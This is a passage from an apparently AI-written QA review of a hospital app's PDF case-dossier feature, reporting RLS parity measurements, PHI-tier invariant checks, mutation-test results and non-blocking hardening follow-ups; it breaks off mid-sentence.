Confirmed as sound reasoning, not re-reported as discoveries:

- **`FUP-P3-MINT-AFFORDANCE-WIDER-THAN-ITS-DOOR`** — narrowed correctly. The card is now
  gated on the door's own answer for the **de-identified** authority; the identified variant
  needs `app.can_read_case_patient`, which is not on the detail envelope, so the checkbox still
  renders for a caller who will be refused on submit. Closing it needs a backend surface change
  and **must not** be faked by re-deriving the PHI door in the page. The residue is named at
  the call site. **Agreed.**
- **`FUP-P3-DOSSIER-HAS-NO-RECUSAL-ROSTER`** — `recusalDisplay` is hard-`null`
  (`pdf-payload.ts:364`) because `CaseDetail.myRecusal` is the caller's own recusal only.
  Populating it from that would make the artifact vary by minter with none of the A7 exception's
  justification — a **second** A7 exception bought for nothing. **Agreed; the right call.**
- **Disposed-case degradation has no E2E.** `dispose_case_phi` is irreversible against a seed
  ~900 tests depend on, and the harness constructs no case of its own. Covered by pgTAP `368`
  plus a committed disposed fingerprint. **Accepted as a stated bound.** The graceful-degradation
  logic is genuinely reviewable statically and I did review it: `section()` returns null on empty
  HTML (`case.ts:132`), `narrativesSection` filters nulled bodies before mapping,
  `interviewsSection` deliberately keeps metadata and drops only the summary — with the asymmetry
  argued at `case.ts:276-289` — and the disposal notice is framed as a fact, not an error.

---

## 10. Process note — gate ordering

CLAUDE.md § 6 puts QA review at **step 3**, after step 2 declares green. PROGRESS.md records
gate 2 as **⛔ RED (UNRUN)** with 36 did-not-run in a batch P3 never touched, and a full-suite
run still owed. This pass therefore runs **ahead** of its gate, at the lead's explicit
instruction, and is scoped to the half that a churning DB cannot contaminate. Recorded so the
sequence is not later read as a completed step 3. ~~**Pass 2 must not issue a verdict until
gate 2 has declared green on a full run.**~~

⛔ **SUPERSEDED 2026-08-25, struck rather than deleted.** The PO ruling landed *after* this pass
was written and **accepts gate 2 standing at RED (UNRUN)** with its cause on record. Pass 2's real
preconditions are a **committed tree** (satisfied — `2c19ae27` for the docs, `a62a2bf3` for the
specs, which also closes **H-1**) and a **settled DB** (the catalog reconciliation). The stale
sentence stood here while two other documents flagged it elsewhere, which is the drift the
meta-review's R-5 is about: the correction belongs in the file that carries the false claim.

---

## 11. Verdict

**NONE. Pass 1 of 2.**

Three blocking candidates (**C-1**, **C-2**, **C-3**) are recorded with file and line, and
**none of them is withdrawable by anything pass 2 could measure**:

- **C-1**'s only catalog dependency is *which* of three fields `dispose_case_phi` redacts, and
  it survives on any one of the three.
- **C-2**'s catalog dependency (Gotenberg egress) moves its severity, not its existence.
- **C-3** is a pure absence in committed test text. `st_x2` is fetched and never used; the
  recused-member download cell has no test; `case_patient.read` appears in no assertion in
  either layer. A catalog read cannot make an unwritten assertion exist.

On the QA posture stated in the role brief — *a single unmet blocking requirement is
`CHANGES REQUESTED` regardless of how much else is correct* — **C-3 alone would decide this
phase today**, and C-1 is an Art. 18 / Rule 12 hole on top of it. Pass 2 exists to settle § 7
and to confirm C-1's premise against `pg_get_functiondef`, not to reopen the question of
whether findings exist.

⛔ ~~Pass 2 must not issue a verdict until **gate 2 has declared green on a full run** and the
tree is committed (**H-1**).~~ **SUPERSEDED — see the correction under § 10.** Committed tree ✅
(`a62a2bf3` closes H-1) · settled DB = the catalog reconciliation · gate 2 stays RED (UNRUN) by
PO ruling. **Pass 2 issues the verdict.**

---

# Pass 2 — the verdict pass

**Date:** 2026-08-25 · **Reviewed at:** `f28df4df` · **Reviewer:** `qa` (same session lineage as
pass 1) · **Verdict:** see § 2.9.

> **Working tree at review time.** Clean except `scripts/e2e-prod-gate.sh`, `scripts/lib/`,
> `scripts/test-netstat-listener-pids.sh` — a teammate's gate-harness work, out of scope and
> not read. Everything under review is committed. **H-1 is closed.**

> ⛔ **I moved the database.** One `supabase db reset --local` (exit 0), then the full pgTAP
> suite, then the committed P3 mutation harness. Every ad-hoc probe I ran was inside a
> transaction I rolled back, and I re-measured the seed afterwards each time (`0` disposed
> cases, `50` answers, `2` `patient_identifiers`, `c2` label intact). The stack is left at
> **460 migrations / `20261003002800`**, freshly reset, pgTAP-green.

> ⚠ **I re-measured every figure rather than inheriting one.** Where my measurement differs
> from what I was told, or from what a document in this repo says, it is called out as a
> **contradiction** and the delta is stated. There are four.

---

## 2.1 ⭐⭐ § 7 item 6 — SETTLED CLEAN, and my first matrix was WRONG

This was the one open item that could still produce a new finding. It does not — but the
route to that answer is the most transferable thing in this pass, so it goes first.

### The question

`buildResponseSections` (`src/lib/forms/pdf-payload.ts:249`) renders a case phase's answers
inside the dossier. The standalone form print wraps the same builder in
`getResponsePrintContext`; the dossier does not. If `app.can_view_printed_document('form_response', …)`
is **narrower** than the `responses`/`answers` SELECT policies, the dossier widens print reach
for individual responses. If it is **wider**, the standalone print path over-reaches RLS.

### ⛔ The trap I walked into first — report it, because it produced a confident false positive

My first matrix cross-joined 36 seed personas × 13 seed responses, computed the door as
`postgres` and the policy as `authenticated`, and reported:

| direction | cells |
| --- | --- |
| DOOR_YES / POLICY_NO | **11** |
| DOOR_NO / POLICY_YES | 0 |

Eleven cells where the print door was **wider than RLS** — exactly `chefe.ccih` and
`chefe.farm` on their own commissions' submitted responses. It reads like a live over-grant.

**It is an artifact of my own harness.** `app.has_role` (live body, catalog) closes with

```sql
  and (p_user_id is distinct from auth.uid() or p_role is not distinct from app.active_role())
```

— the act-as **hat** clause. Called as `postgres`, `auth.uid()` is NULL, so
`p_user_id is distinct from NULL` is TRUE and **the hat clause is vacuously satisfied**. I had
supplied the hat constraint to the policy side (via `request.jwt.claims`) and exempted the door
side from it. The 11 "over-grants" were the hat, not the door.

⭐ **The general rule, which `ARM=hat` does not cover:** `ARM=hat` asks whether a door reads
`memberships` without the caller's hat. A **parity** audit asks something different — whether
two predicates agree — and it is only valid if **both sides are evaluated in the same session
context**, hat included. A parity matrix built with a superuser on one side is structurally
biased toward "the door is wider", and the bias looks exactly like a finding.

### The corrected matrix

Both sides evaluated as role `authenticated`, in one session, under identical
`request.jwt.claims` including `active_role`. Domain = every **(persona × hat)** combination
that exists in `memberships`, plus a no-hat session per persona (**75** combos) × **13**
responses = **975** cells.

| direction | cells |
| --- | --- |
| **DOOR_YES / POLICY_NO** (door wider than RLS) | **0** |
| **DOOR_NO / POLICY_YES** (dossier wider than the print door) | **0** |
| AGREE_YES | 37 |
| AGREE_NO | 938 |

At the **answer** grain, which is what the dossier actually renders:

| measurement | value |
| --- | --- |
| door-YES cells | 37 |
| …of those, cells where **every** answer is visible | **37 / 37** |
| …cells with partial answer visibility | **0** |
| answers expected vs seen on door-YES cells | **146 / 146** |
| answers visible on any of the 938 door-NO cells | **0** |

Positive coverage is real, not a vacuous all-refuse sweep — 6 personas, both hat states, both
`submitted` and `in_progress`:

| persona | hat | status | responses | answers |
| --- | --- | --- | --- | --- |
| `chefe.ccih` | `staff_admin` | submitted | 7 | 26 |
| `chefe.farm` | `staff_admin` | submitted | 4 | 20 |
| `staff1.ccih` | `staff` / none | submitted + in_progress | 5 + 5 | 15 + 15 |
| `staff1.farm` | `staff` / none | submitted + in_progress | 3 + 3 | 13 + 13 |
| `staff2.ccih` | `staff` / none | submitted | 3 + 3 | 12 + 12 |
| `staff2.farm` | `staff` / none | submitted | 2 + 2 | 10 + 10 |

### The differ is proven able to move — two neutralizations, both rolled back

A zero in both directions is worthless without this.

| control | mutation (in a rolled-back transaction) | observed |
| --- | --- | --- |
| **A — narrow the door** | drop the `is_staff_admin_of_for` arm from the `form_response` branch | **DOOR_NO / POLICY_YES = 11**, and the 11 are precisely `chefe.ccih`×7 + `chefe.farm`×4 under the `staff_admin` hat |
| **B — widen the door** | replace the branch with "any member of the response's commission" | **DOOR_YES / POLICY_NO = 171** |

Both directions move, with the right personas and the right magnitudes. The door body was
re-read afterwards and both distinguishing arms (`is_staff_admin_of_for`,
`can_read_full_case_content`) are present — the rollback restored it.

### And the answer nobody had to measure empirically: **Axis C already applies the door**

`app.can_read_full_case_content`, live body, Axis C:

```sql
  if exists (
    select 1
    from public.case_phases cp
    join public.responses r on r.id = cp.current_response_id
    where cp.case_id = p_case_id
      and not app.can_view_printed_document('form_response', r.id, p_uid)
  ) then
    return false;
```

So the dossier arm **is** the per-response print gate, applied to every phase, all-or-nothing.
Two independent facts close the item in the **safe** direction:

1. **The gated set is a superset of the inlined set.** Axis C iterates every phase's
   `current_response_id` regardless of `cp.status`; `get_case_detail` returns a `response_id`
   only for phases in `('completed','awaiting_signoff')`. Everything inlined is gated, plus more.
2. **The dossier is narrower, not wider.** Standalone print is per-response; the dossier
   refuses entirely if any one phase response is unprintable by the caller.

And the whole answer leg reads under the **caller's session client** — `getResponseForFill`,
`getVersionTree`, `getResponseSignoffs` all use `createClient()` from `@/lib/supabase/server`
(anon key + request cookies). The only service-role read reachable from either payload builder
is `printed-documents.ts:511` / `:388`, fetching `commissions.name` + `hospitals.name` for the
letterhead from a `commission_id` already obtained through a caller-session read. **No PHI, no
pivot.**

⚠ **Where the parity is load-bearing in a way nobody wrote down.** Because Axis C composes the
`form_response` door with an RLS-mediated TypeScript read, the two must agree or the dossier
misbehaves *silently*:

- door **wider** than RLS → Axis C passes, the TS read returns fewer answers → a **registered,
  hash-sealed dossier that silently omits content**;
- door **narrower** → the whole dossier is refused → availability, not disclosure.

The parity I measured is exactly the property that keeps both off the table. It is currently
pinned by **nothing** — no pgTAP cell, no unit test, no E2E assertion compares the two. That is
**N-2** below.

**Item 6: CLOSED. No widening. No finding.**

---

## 2.2 C-1 re-verified end to end — and the tier question answered

### The fix, in code

| claim | measured |
| --- | --- |
| `containsPhi = !context.caseDisposed` | ✅ `src/lib/cases/pdf-payload.ts:507`, single term, no disjunction, no local default |
| the disjunction + `renderedPatientField` deleted | ✅ **declarations** gone (verified against `d4215971^`, not against string absence). ⚠ **Contradiction with the brief:** `src/` is *not* zero hits — three comment-only mentions survive (`pdf-payload.ts:447` inside the ⛔ "DO NOT RESTORE A PRESENCE DERIVATION HERE" block; `pdf-payload.test.ts:298,339`). All three are deliberate history at the right sites. Not a defect; stated so the next grep does not read as a regression. |
| `CasePrintContext.caseDisposed` non-nullable | ✅ `printed-documents.ts:440-451`, `caseDisposed: boolean`; nullability lives on the whole context |
| `getCasePrintContext` refuses rather than coalesces | ✅ `:484-509` — `if (!derivation) return null`, then a **runtime `typeof` triple-check** (`case_disposed`/`source_revision`/`status`) returning `null`. Not a type assertion: it catches what `.maybeSingle<T>()` cannot. |

### The premise, re-measured myself from `pg_get_functiondef` (comments stripped)

`public.dispose_case_phi` redacts, among 15 statements: `cases.label := '[PHI removido]'`,
`case_events.body` **and** `.title := '[PHI removido]'`, `documents.title := '[PHI removido]'`
with `description = null`, `case_narratives.body_md := null`, `case_interviews.summary_md := null`,
`meeting_cases.summary`/`.decision`, and a hard `delete from public.patient_identifiers`. The
`printed_documents` revocation is gated:

```sql
 where source_kind = 'case' and source_id = p_case_id
   and contains_phi
   and status <> 'revoked'
```

**C-1's premise stands on all three fields independently.** ✅

### ⭐ Can a case document still reach `standard` tier by any route? — **constructed, not reasoned**

The claim on record (Amendment 5) is *"No registered case document can be standard-tier any
more, without exception."* I tried to break it four ways.

**First, the fact that makes the question sharp:** `public.mint_printed_document`'s signature is
`… p_contains_phi boolean DEFAULT false …`. The DB does **not** derive the tier — the caller
supplies it, and the default is the C-1 value. `app.printed_rendition_storage_bucket(false)`
returns `documents-standard`, and `file_objects_bucket_from_tier` then forces
`sensitivity_tier = 'standard'`.

**Probe 1 vs 2 — the incidental-guard check.** Minting `('case', c2, contains_phi := false)`
as an entitled persona raised `HC0D3 objeto de armazenamento ausente`. Minting the **same call
with `contains_phi := true`** raised **the identical error**. ⛔ So that guard is *not* a
`contains_phi` check — it is the storage-object precondition, and it refuses both values
equally. Reading it as protection would be the "an incidental guard closes a hole the definition
predicts" error.

**Confirmed by enumeration: the mint door has no kind↔tier check.** Live `prosrc`, `--` comments
stripped, no line filtering: **17** `p_source_kind` references (18 raw; one is inside a comment),
of which **8** are kind-conditional in **3** clusters — template×kind validity (3), commission
resolution `if/elsif/elsif` (3), and the PHI cluster (2). The PHI cluster is:

```sql
  if coalesce(p_contains_phi, false) and p_source_kind not in ('meeting', 'case') then raise …
  if p_source_kind = 'case' and p_template_key = 'case_identified'
     and not app.can_read_case_patient(p_source_id, v_uid) then raise …
```

The first refuses `contains_phi = TRUE` for `form_response`. **The mirror — refusing
`contains_phi = FALSE` for `case` — does not exist.** (A8's "exactly three kind-conditional
sites" holds in substance; each cluster is fail-closed for an unhandled kind, and
`can_view_printed_document`'s `else` arm refuses an unknown kind before any of them.)

**So what actually closes it?** Three measured facts, and it takes all three:

1. **`authenticated` has SELECT only** on `file_objects` and `upload_sessions` — no INSERT. The
   sole reservation door is `public.begin_document_upload` (DEFINER, granted `authenticated`).
2. **That door cannot produce a printed-rendition path.** It derives
   `<organization_id>/<file_id>/<random uuid>`; `app.printed_rendition_storage_path(p_id)` is
   `'printed/' || p_id || '.pdf'`. Disjoint namespaces. Storage INSERT is additionally gated on
   `app.storage_upload_reserved`, which requires a matching `file_objects` row. ⇒ **no client
   can place bytes at a printed-rendition path.**
3. **D3 — constructed through the real door, then rolled back.** This is the decisive one:

   | measurement | before | after `dispose_case_phi(c2, 'subject_request')` |
   | --- | --- | --- |
   | `app.print_source_registers('case', c2)` | **true** | **false** |
   | `cases.label` | `Óbito UTI leito 3` | `[PHI removido]` |
   | `app.case_is_terminal('case', c2)` | true | true (correctly unchanged — a different question) |
   | mint with `contains_phi := false` | (storage precondition) | **refused `HC0DP`** |

   ⇒ **The only state in which TypeScript can produce `contains_phi = false` for a case is
   exactly the state in which the DB refuses to mint.** `contains_phi = false ⟺ caseDisposed ⟺
   HC0DP`. The complement is airtight.

**Verdict on the tier question: the invariant HOLDS, and it is DB-backed** — by the registration
gate, not by a tier check. ⚠ **Stated precisely, because the difference matters for the next
edit:** the DB refuses the *disposed case*, never the *value `false`*. Re-introduce any
derivation for `containsPhi` and a **live** case could mint standard-tier with nothing in the
catalog objecting. That is **N-1**, and it is why the ⛔ block at `pdf-payload.ts:440-506` is
load-bearing rather than decorative.

### The keystones that pin it

`src/lib/cases/pdf-payload.test.ts:334-373` (t1) and `:375-419` (t2). I checked the property that
matters — **could each pass under the deleted rule?**

- **t1** (`caseLabel = 'Queda da paciente Maria Silva, leito 302'`, `patientsAnswer = []`,
  `timelineAnswer = []`, everything else empty, asserts `containsPhi === true`): under the old
  rule `renderedPatientField` is `.some()` over `[]` = false and every `hasMaskedFreeText`
  disjunct is false ⇒ old rule yields `false` ⇒ **reds**. A genuine differential. Four
  non-vacuity controls assert the fixture actually rendered empty and that the label survived.
- **t2** (`caseDisposed = true` + one retained event with a non-null `[PHI removido]` body,
  asserts `containsPhi === false`): under the old rule `timeline.some(e => e.body !== null)` is
  true ⇒ old rule yields `true` ⇒ **reds**. The differential in the opposite direction — the one
  Amendment 5 says was only found by building the keystone.
- **t3** (fat live case) reds under a bare `false`, so it is a real one-sided differential and
  the file says so after correcting its own first draft.

The embedded mutation table (`:292-307`) records three TS mutations with **discriminating**
outcomes (`true` reds t2 only and leaves t1 green; `false` reds t1 and t3). ⚠ There is no
landing check on those three — but a non-landed edit cannot produce a *discriminating* pattern,
so the differential is itself the landing evidence. Acceptable.

⚠ **Bound, and the file states it about itself:** `@/lib/queries/cases` is mocked wholesale, so
this keystone cannot fail for a defect *inside* that module. It is provider-logic evidence only.

**C-1: CLOSED.**

---

## 2.3 § 7 — the eleven items, each settled

| # | item | settlement |
| --- | --- | --- |
| **1** | 27-gate reconciliation, both directions | ✅ **VERIFIED INDEPENDENTLY.** I re-derived the set from the catalog myself: **27** functions, **all `prosecdef = t`**, **zero NULL `proacl`**. The ten `app.*` print helpers + 12 trigger functions are `{postgres=X/postgres}` only — no `authenticated`, no PUBLIC; the five `public.*` doors carry `authenticated` + `service_role` deliberately. This reproduces `docs/progress/pdf-p3-reconciliation.md` without inheriting it. |
| **2** | `dispose_case_phi` redaction list | ✅ **VERIFIED** from `pg_get_functiondef`, comments stripped — see § 2.2. All three fields, plus more. |
| **3** | `can_read_full_case_content` fail-closed on an empty case | ✅ **VERIFIED in the LIVE body** (fail-closed preamble ahead of all seven axes; null/unknown-case guards) **and by sweep.** ⚠ My first sweep was contaminated the same way item 6's was — run as `postgres` it inherits the hat vacuity. Hatted, through a temporary granted wrapper (the helper is `postgres`-only, correctly): **600** (persona × hat × case) cells → **30 true / 570 false**; on the **5 empty cases** specifically, **22 true / 353 false**. `(null,null)`, unknown case, and null uid all **false**. Not vacuously true on an empty case. |
| **4** | mint door's kind-conditional sites still exactly three | ✅ **VERIFIED** in live `prosrc`, comments stripped, **no line filtering** — 17 references, 8 kind-conditional in 3 clusters, each fail-closed for an unhandled kind. Detail in § 2.2. |
| **5** | ACLs for the two DROP+CREATEs; the PUBLIC-executable ratchet back at **237** | ✅ **VERIFIED, and the parts sum:** NULL `proacl` in `app`+`public` = **228**; explicit `=X/` PUBLIC grants = **9**; total PUBLIC-executable = **237**. Exactly the ratchet `320` exists to hold, and **0 of the 27** carries a NULL `proacl`. |
| **6** | `can_view_printed_document('form_response', …)` vs the answer read policies | ✅ **SETTLED CLEAN, both directions, 975 cells, both controls move** — § 2.1. |
| **7** | Gotenberg egress | ✅ **VERIFIED OPEN, not merely unverified.** The dev recipe is `docker run -d --name gotenberg-pdf -p 3010:3000 gotenberg/gotenberg:8.24.0` — no `--network`, no egress restriction, so Docker's default bridge gives full outbound. Coolify constrains inbound only. ⇒ **C-2 was a live exposure, not a theoretical one**, and the schema+transform is currently the *sole* mitigation. Correctly recorded as such in ADR 0145 and deferred to a filed follow-up by PO ruling. |
| **8** | what keystone pins the `containsPhi` formula (M-1) | ✅ **SETTLED.** `…002600_….sql:204-227` now **states the constitutive rule** (`containsPhi := NOT caseDisposed`, "WITHOUT DERIVING ANYTHING"), quotes the old formula only inside a ⛔ correction block, and names `src/lib/cases/pdf-payload.test.ts` as the keystone. Cross-checked: the keystone **exists** and pins the built rule, not the cited one — § 2.2. |
| **9** | `is_staff_admin_of` fails closed on a null `auth.uid()` | ✅ **VERIFIED by direct call:** `app.is_active(null) = false`, `app.has_role('commission', …, 'staff_admin', null) = false`, `app.is_staff_admin_of(…)` with a null uid = **false**. So `dispose_case_phi`'s guarantee that `revoked_by` is never null — and hence that block (f2) satisfies `pd_revocation_complete` rather than raising mid-erasure — is sound. |
| **10** | `case_print_revisions` grants genuinely empty for `anon`/`authenticated` | ✅ **VERIFIED.** `information_schema.role_table_grants` for that table lists **only** `postgres` and `service_role`. RLS is **on**; **zero** policies. Amendment 4's `revoke all` beat Supabase's default grant. |
| **11** | the `368` mutation audit — read the records, and check each mutation LANDED | ✅ **SETTLED BY RUNNING IT, not by reading it** — § 2.4. |

---

## 2.4 § 7 item 11 — I ran the mutation harness myself

Precondition: fresh `db reset` + full pgTAP PASS immediately before, so the tree was **proven
unmutated** rather than assumed so. `bash supabase/tests/mutation/p3-case-print-mutation-audit.sh`,
exit **0**.

| run | expected fingerprint | **observed** | match |
| --- | --- | --- | --- |
| baseline 1/2 | 58 ok | **58 ok, 0 not ok** | ✅ |
| **1a** gate 1 opened | suite ABORTS at t38a; the abort *is* the finding | aborted at t38a → t38a…t48 `GONE` (13) | ✅ |
| **1b** resolver deliberation conjunct alone | **NOTHING** reds — gate 1 independently load-bearing | `NOT PROVEN — the mutation changed no verdict` | ✅ |
| **1c** all three download locks | t38a **and** t38b RED (a leak, not an abort); t36 green | t38a, t38b RED; t36 not in the set | ✅ |
| **2** gate 2 opened | t36 RED; t38a/t38b green | t36 RED, alone | ✅ |
| **3** PHI-read emission guarded off | t40 RED; t18 + t40a green | t40 RED, alone | ✅ |
| **4** mint made to call the audited reader | t40a RED; t40 + t35 green | t40a RED, alone | ✅ |
| **5** respondent hard-deny removed | t28d/e/f/g + t38b RED; t25/26/28/t38a green | **exactly** t28d, t28e, t28f, t28g, t38b | ✅ |
| **6** recusal hard-deny removed | t25/26/28/t38a RED; t28a-g + t38b green | **exactly** t25, t26, t28, t38a | ✅ |
| baseline 2/2 | 58 ok | **58 ok, 0 not ok** | ✅ |

**Every mutation landed.** `grep -c "DID NOT APPLY|DID NOT LAND|HALF-APPLIED"` over the whole
run = **0**, and `_mut_368` raises on each of those three conditions. That matters most for
**1b**: the harness prints `NOT PROVEN … either the needle drifted or no assertion stands behind
this body`, which is ambiguous on its face — the absence of a landing exception is what makes it
readable as the second. ⭐ **The landing guard is what converts a zero-differential mutation from
noise into a reading.** This is the right answer to "a mutation that did not fully apply reports
GREEN", and it is better than a recorded hash because it re-checks on every run.

**What this settles beyond the record's own claim:**

- **C-3's four cells are each independently load-bearing.** Runs **5** and **6** move
  **disjoint** sets — the respondent persona and the recused persona are separately pinned, on
  mint *and* download. Amendment 6's report that the recusal cell had been **vacuous** (no
  positive arm to deny) is **confirmed repaired by measurement**: that mutation now moves four
  verdicts.
- **M-3's repair is a genuine two-sided differential.** Runs **3** and **4** each move exactly
  one of `t40` / `t40a`, on the same counter. That is causation, not coincidence.
- **The two download gates are independent, not one gate counted twice.** Run **1c** reds
  t38a/t38b and leaves t36 green; run **2** does the converse. This is the direct answer to the
  documented "a door can have two locks — and the second lock was the same predicate twice" trap.

⚠ **Minor hygiene gap (not a finding):** the eight *expected* fingerprints are committed in the
script; the *observed* sets are not committed anywhere — only a commit-message summary. The next
reader must re-run to check the sets. Recommend committing the run's output beside the script.
The record is honest about its own scope in three places, so this is a convenience gap, not an
over-claim.

---

## 2.5 The `destination stream closed early` signal — **BENIGN, with two follow-ups**

`⨯ Error: The destination stream closed early.` (digest `504373718`), in **every** run of the
print spec including the clean 11/11 ones, after prévia/download requests. `tester` reported it
rather than dismissing it. Here is the call, with the reasoning.

### Mechanics, measured

1. **Both PDF routes fully materialize the body before the `Response` exists.**
   `src/app/api/previa/[kind]/[id]/route.ts:197` and `src/app/api/documents/[id]/route.ts:64`
   both return `new Response(new Uint8Array(buf), …)`. No `ReadableStream`, no Node stream, no
   `.pipe()`, no `NextResponse`. The prévia buffer comes from `renderPreviaPdf(): Promise<Buffer>`;
   the download from `await blob.arrayBuffer()` → `applyStatusOverlay(): Promise<Uint8Array>`.
2. **All audit work is awaited BEFORE the body is handed over, and the prévia's log is a
   precondition of delivery.** `log_document_previa` at `route.ts:183-187` is awaited and
   fail-closed at `:188-195` (`if (auditError) return 404`), 14 lines before the 200.
   `open_printed_document` (`documents/route.ts:33-35`) both authorizes and emits
   `document.downloaded` *before* the Storage download, the overlay, and the return. No
   `after()`, no `waitUntil`, no `.then()` on a response.
3. **The specs abandon bodies at exactly the matching sites.**
   `e2e/pdf-printing-cases.spec.ts:887-888` (a full case prévia rendered, logged, returned, and
   the buffer dropped), `:935-938` (the `?phi=` spelling loop — four more 200-byte-streams
   discarded), and `:1298-1301` (a real `download` event where nothing calls `path()`,
   `saveAs()`, or `failure()`, so the context tears down mid-transfer). The sibling specs
   duplicate the download pattern.

### The call

**Not a security finding.** Three reasons, and each is sufficient:

- The failure is **client-side abandonment of a complete server-side buffer**. There is no
  lazily-produced body for a truncation to corrupt — the bytes exist in RAM before the first one
  is written.
- It **cannot mask an unaudited PHI export**, which is the worry worth having. The audit row is
  written and awaited *before* the bytes. The failure direction is **over**-audit — a
  `document.downloaded` row for bytes the client dropped — which is the conservative direction
  for Rule 11.
- A truncated PHI document is a **less**-disclosing outcome than a complete one. There is no
  reading of this signal in which more data leaves than intended.

**But it should not stay unattributed, on two counts:**

- **N-3** — `assertRealPdf` (`:397-400`) validates **only** `%PDF-` magic bytes and
  `byteLength > 1000`. No `%%EOF`, no xref parse, no page count. A dossier truncated anywhere
  past ~1 KB passes. The sibling print specs are weaker still — magic bytes with **no length
  floor at all**. Nothing in `e2e/` asserts `%%EOF` against a served PDF. So while I can show
  the signal is benign *by mechanism*, the suite could not have told us either way.
- **N-4** — the repo has already misread this string **four times** as a Windows
  monolith-collapse / server-death signature (`docs/progress/test-run-archive.md:222,244,515`,
  `ff-5-entity-reference.md:129`, `ff-3-validation-engine.md:370,397`) and **once** correctly as
  benign client-abort noise (`docs/progress/follow-ups.md:5862-5864`). **No document connects it
  to the PDF routes or to the abandoned-body pattern, and the digest `504373718` appears
  nowhere.** An unattributed signal that already has a wrong attribution on record will be
  misread again during the next gate-2 collapse investigation.

**Recommendation:** drain the abandoned bodies (or `dispose()` them) so the print spec stops
emitting it, and record the attribution beside `follow-ups.md:5862`. Both are follow-ups, not
phase blockers.

---

## 2.6 Security / RLS for the phase, on the settled catalog

Everything here is a catalog or runtime measurement taken this pass.

- **Rule 1 — RLS/DB is the boundary.** The case print arm is
  `app.can_read_case AND app.can_read_full_case_content`, and I verified the **conjunction
  itself** rather than trusting the text: over **600** (persona × hat × case) cells,
  `door ≡ (reach ∧ fullsight)` with **0 mismatches** — non-vacuous, since the door is true for 30
  of them. `print_source_state` gates on the door before resolving anything, so the **prévia**
  path — the wider surface, since it serves non-registering cases the mint refuses — is Axis-C
  gated too.
- **D8's accepted exclusions hold at the DB layer.** Recused pairs in the seed: **2**;
  door-YES among them: **0**. The phase-only respondent is refused on the A7 arm, on mint, and
  on download (t28f/t28g/t38b, each mutation-proven — § 2.4).
- **No service-role key is reachable client-side.** `SUPABASE_SERVICE_ROLE_KEY` is read only in
  `src/lib/supabase/admin.ts`; no `"use client"` file imports `createAdminClient`; the complete
  `NEXT_PUBLIC_*` set in `src/` is `NEXT_PUBLIC_SITE_URL`, `NEXT_PUBLIC_SUPABASE_URL`,
  `NEXT_PUBLIC_SUPABASE_ANON_KEY`.
- **The public `/verificar` surface leaks nothing.** `public.lookup_printed_document` returns
  exactly `TABLE(matched boolean, status text, minted_at timestamptz, source_kind text,
  hospital_name text, document_id uuid, is_current boolean)`. No `source_id`, no case label, no
  `contains_phi`, no minter, no content. P3 made case dossiers verifiable without widening that
  projection — the right outcome for a class Amendment 5 makes **entirely** PHI-classified.
- **Rule 11 ordering is correct and fail-closed.** § 2.5 point 2. The prévia's asymmetry
  (PHI-read row present, mint row absent) is pinned in pgTAP for the absence half (twice) and in
  E2E for the presence half — and I checked the E2E pin's *shape*: `withAuditWindow`
  (`:462-477`) is a **delta by row id**, re-snapshotted inside each loop iteration, matched with
  `.toEqual([one element])`, and preceded by a **channel control** asserting
  `document.previa_printed` from the same request in the same window. So a zero cannot pass as
  an absence, a shared row cannot satisfy both iterations, and "the audit trail is switched off"
  is excluded before the PHI assertion is allowed to mean anything. Commit `f28df4df` records a
  positive control proving the two pins are not satisfiable by one row.
- **Rule 7 / ADR 0145.** `PDF_MARKDOWN_SANITIZE_SCHEMA` (`src/lib/markdown/sanitize-schema.ts:109-118`)
  is genuinely **derived** — `...MARKDOWN_SANITIZE_SCHEMA` with `img` filtered from both
  `tagNames` and `attributes`, `satisfies typeof defaultSchema`. One consumer
  (`src/lib/pdf/markdown.ts:169`). The print schema cannot loosen anything because it is the
  shared schema minus one tag. Both stale "fetches nothing" comments are corrected and the third
  is marked as an obligation with a pointer.
- **Rule 12.** Every live case dossier is `contains_phi = true` (§ 2.2), so the `phi/` prefix,
  the band, and the disposal revocation reach all of them. `resolvePatients` remains the single
  fork point and nulls the five identified fields explicitly rather than omitting them; `patient_key`
  / `encounter_key` are absent from the type, so the compiler enforces D5.
- **Rule 10 / a11y on the phase's UI.** pt-BR throughout. The PHI checkbox
  (`mint-document-button.tsx:236-258`) is wrapped in a real `<label>` with visible text and
  `aria-describedby` pointing at **both** the hint and the permanence notice; the band notice is
  icon + text + border, never colour alone; decorative icons are `aria-hidden`;
  `printed-documents-panel.tsx` carries `aria-labelledby`, `role`, `aria-busy`, `aria-label`,
  `sr-only`.
- **No raw Postgres errors in the UI.** `src/lib/pdf-mint/actions.ts:142` allowlists exactly
  `HC0D1/2/3/5` as surfaceable; `42501` maps to a house pt-BR string per door; everything else
  falls to `GENERIC_MINT_ERROR`. ⚠ Minor: `HC0DP` ("use a prévia") and `HC0DU` ("the record
  changed during generation") are **not** surfaceable, so the user gets a generic message where
  a specific actionable one exists. The affordance gating should make `HC0DP` unreachable through
  the UI, so this is an observation, not a finding.
- **ADR hygiene.** ADR 0145 declares `**Supersedes:** nothing. **Amends:** ADR 0014` with the
  number; the index records `amends 0014`; ADR 0014 carries the **generated** back-pointer
  banner; 0104 shows `⚠ amended by 0125, 0144`. `lint:adr-index` is green, so none of it has
  drifted. Next free number is 0146.

---

## 2.7 New findings this pass — all NON-BLOCKING

⚠ **Severity discipline, restated because the record demands it:** pass 1's **C-3** and **M-3**
were **missing evidence**, not defects, and are not to be quoted at C-1's severity. Everything
below is likewise a **follow-up**, not a defect. None of it blocks the phase.

**N-1 — the mint door enforces the kind↔tier rule in one direction only.** `LOW / hardening.`
`p_contains_phi` defaults to `false`; the door refuses `TRUE` for `form_response`
(`p_source_kind not in ('meeting','case')`) but has **no mirror** refusing `FALSE` for `case`.
Amendment 5's "no registered case document can be standard-tier, without exception" holds today
— closed by the D3 registration gate (§ 2.2, constructed), not by a tier check. ⛔ The
composition is one edit from breaking: any future derivation for `containsPhi` reopens it for a
**live** case with nothing in the catalog objecting. Recommend a `if p_source_kind = 'case' and
not coalesce(p_contains_phi,false) then raise` conjunct so the invariant lives where Rule 1 puts
it. **Not reachable today** — and "not reachable" is not "protected", which is exactly why this
is filed rather than dropped.

**N-2 — the door↔policy parity that Axis C depends on is pinned by nothing.** `MEDIUM / evidence.`
Axis C composes `can_view_printed_document('form_response', …)` with an RLS-mediated TypeScript
answer read. If they diverge, the failure is **silent in both directions** (§ 2.1). I measured
them equal over 975 cells with both controls moving; **no test, in any layer, compares them.**
A cross-kind pgTAP vector asserting set-equality of the door and the `answers_select` disjunction
would pin it. Related and compounding: `getResponseForFill` (`src/lib/queries/responses.ts:844-979`)
